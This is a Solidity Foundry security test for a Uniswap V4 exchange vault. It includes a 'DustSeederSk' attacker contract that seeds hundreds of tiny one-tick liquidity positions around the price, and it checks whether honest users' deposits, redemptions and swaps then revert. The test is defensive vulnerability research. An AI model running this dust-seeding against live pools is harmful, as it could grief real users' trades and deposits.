// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {ModifyLiquidityParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";

/// Unprivileged attacker: mints/burns liquidity-1 one-spacing positions directly on the PoolManager.
contract DustSeederSk is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    IPoolManager immutable pm;
    PoolKey key;
    int24 lo; int24 n; int256 sign;

    constructor(IPoolManager pm_, PoolKey memory k) { pm = pm_; key = k; }

    function seed(int24 startTick, int24 count, bool add) external {
        lo = startTick; n = count; sign = add ? int256(1) : int256(-1);
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(pm));
        int24 s = key.tickSpacing;
        int256 d0; int256 d1;
        for (int24 i; i < n; ++i) {
            (BalanceDelta d,) = pm.modifyLiquidity(key, ModifyLiquidityParams(lo + i * s, lo + (i + 1) * s, sign, bytes32(0)), "");
            d0 += d.amount0(); d1 += d.amount1();
        }
        _settle(key.currency0, d0); _settle(key.currency1, d1);
        return "";
    }

    function _settle(Currency c, int256 d) internal {
        if (d < 0) { pm.sync(c); IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-d)); pm.settle(); }
        else if (d > 0) pm.take(c, address(this), uint256(d));
    }
}

contract FsDustSkepticTest is TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault, IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using PoolIdLibrary for PoolKey;

    IStandardExchangeProxy internal vault;
    PoolKey internal poolKey;
    IERC20 internal token0;
    IERC20 internal token1;
    DustSeederSk internal attacker;
    address internal constant BOB = address(0xB0B);
    address internal constant ATK = address(0xA77AC4E5);

    function _spacing() internal pure virtual returns (int24) { return 1; }
    function _fee() internal pure virtual returns (uint24) { return 100; }
    function _dustPerSide() internal pure virtual returns (int24) { return 300; }

    function setUp() public virtual override {
        super.setUp();
        ERC20PermitMintableStub a = new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32);
        ERC20PermitMintableStub b = new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32);
        bool ordered = address(a) < address(b);
        token0 = IERC20(ordered ? address(a) : address(b));
        token1 = IERC20(ordered ? address(b) : address(a));
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), _fee(), _spacing(), IHooks(address(0)));
        poolManager.initialize(poolKey, TickMath.getSqrtPriceAtTick(1) - 1e14);
        poolManager.unlock(abi.encode(uint128(2_000e18))); // honest external full-range LP
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
        uint256[] memory amts = new uint256[](2); amts[0] = 10_000e18; amts[1] = 10_000e18;
        IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, amts, IERC20(address(vault)), 0, address(this), false, block.timestamp);

        token0.transfer(BOB, 1_000e18); token1.transfer(BOB, 1_000e18);
        vm.startPrank(BOB, BOB);
        token0.approve(address(vault), type(uint256).max); token1.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        attacker = new DustSeederSk(poolManager, poolKey);
        token0.transfer(address(attacker), 1e6); token1.transfer(address(attacker), 1e6); // a few wei needed
        vm.roll(block.number + 1); vm.warp(block.timestamp + 12);
    }

    function unlockCallback(bytes calldata data_) external returns (bytes memory) {
        uint128 liq = abi.decode(data_, (uint128));
        int24 s = _spacing();
        (BalanceDelta delta,) = poolManager.modifyLiquidity(poolKey, ModifyLiquidityParams(
            TickMath.minUsableTick(s), TickMath.maxUsableTick(s), int256(uint256(liq)), bytes32(0)), "");
        if (delta.amount0() < 0) { poolManager.sync(poolKey.currency0); token0.transfer(address(poolManager), uint128(-delta.amount0())); poolManager.settle(); }
        if (delta.amount1() < 0) { poolManager.sync(poolKey.currency1); token1.transfer(address(poolManager), uint128(-delta.amount1())); poolManager.settle(); }
        return "";
    }

    // ---- honest operations (each run from a snapshot; returns success + revert data) ----
    function _zapDeposit(uint256 amt) internal returns (bool ok, bytes memory err) {
        vm.prank(BOB, BOB);try vault.exchangeIn(token0, amt, IERC20(address(vault)), 0, BOB, false, block.timestamp) returns (uint256 s, uint256) {
            ok = true; console2.log("  zap deposit shares", s);
        } catch (bytes memory e) { err = e; }
    }
    function _zapRedeem(uint256 shares) internal returns (bool ok, bytes memory err) {try vault.exchangeIn(IERC20(address(vault)), shares, token0, 0, address(this), false, block.timestamp) returns (uint256 o, uint256) {
            ok = true; console2.log("  zap redeem token0 out", o);
        } catch (bytes memory e) { err = e; }
    }
    function _swapIn(uint256 amt) internal returns (bool ok, bytes memory err) {
        vm.prank(BOB, BOB);try vault.exchangeIn(token0, amt, token1, 0, BOB, false, block.timestamp) returns (uint256 o, uint256) {
            ok = true; console2.log("  exact-in swap out", o);
        } catch (bytes memory e) { err = e; }
    }
    function _swapOut(uint256 out) internal returns (bool ok, bytes memory err) {
        vm.prank(BOB, BOB);
        try vault.exchangeOut(token0, type(uint256).max, token1, out, BOB, false, block.timestamp) returns (uint256 i) {
            ok = true; console2.log("  exact-out swap in", i);
        } catch (bytes memory e) { err = e; }
    }

    struct Res { bool dep; bool red; bool sin; bool sout; }

    function _runAll(string memory tag) internal returns (Res memory r) {
        console2.log(tag);
        uint256 redeemShares = vault.balanceOf(address(this)) / 100; // 1% of victim's holding
        bytes memory e;
        uint256 snap = vm.snapshotState();
        (r.dep, e) = _zapDeposit(300e18); if (!r.dep) { console2.log("  zap deposit REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
        (r.red, e) = _zapRedeem(redeemShares); if (!r.red) { console2.log("  zap redeem REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
        (r.sin, e) = _swapIn(100e18); if (!r.sin) { console2.log("  exact-in swap REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
        (r.sout, e) = _swapOut(5e18); if (!r.sout) { console2.log("  exact-out swap REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
    }

    function _seed(bool add) internal {
        int24 s = _spacing();
        (, int24 tick,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        int24 base = (tick / s) * s; int24 n = _dustPerSide();
        vm.startPrank(ATK, ATK);
        for (int24 off; off < n; off += 100) {
            int24 c = n - off < 100 ? n - off : int24(100);
            attacker.seed(base + s + off * s, c, add);
            attacker.seed(base - (off + c) * s, c, add);
        }
        vm.stopPrank();
    }
    function _try(uint256 kind, uint256 amt) internal returns (bool ok) {
        uint256 snap = vm.snapshotState(); bytes memory e;
        if (kind == 0) (ok, e) = _zapDeposit(amt);
        else if (kind == 1) (ok, e) = _zapRedeem(amt);
        else if (kind == 2) (ok, e) = _swapIn(amt);
        else (ok, e) = _swapOut(amt);
        if (!ok) console2.logBytes(e);
        vm.revertToState(snap);
    }
    function _report(string memory tag) internal {
        console2.log(tag);
        console2.log(" zapDep 10/30/50e18", _try(0, 10e18) ? 1 : 0, _try(0, 30e18) ? 1 : 0, _try(0, 50e18) ? 1 : 0);
        console2.log(" zapDep 70/100/150e18", _try(0, 70e18) ? 1 : 0, _try(0, 100e18) ? 1 : 0, _try(0, 150e18) ? 1 : 0);
        uint256 b = vault.balanceOf(address(this));
        console2.log(" zapRedeem 0.1%/1%/3%", _try(1, b / 1000) ? 1 : 0, _try(1, b / 100) ? 1 : 0, _try(1, b * 3 / 100) ? 1 : 0);
        console2.log(" swapIn 10/100e18", _try(2, 10e18) ? 1 : 0, _try(2, 100e18) ? 1 : 0);
        console2.log(" swapOut 0.1/1e18", _try(3, 1e17) ? 1 : 0, _try(3, 1e18) ? 1 : 0);
    }
    function test_skeptic() public {
        _report("== baseline");
        _seed(true);
        _report("== dust");
        _seed(false);
        _report("== unwound");
    }
}

/// tickSpacing 10 / fee 500
contract FsDustSkepticSp10Test is FsDustSkepticTest {
    function _spacing() internal pure override returns (int24) { return 10; }
    function _fee() internal pure override returns (uint24) { return 500; }
    function _dustPerSide() internal pure override returns (int24) { return 300; }
}
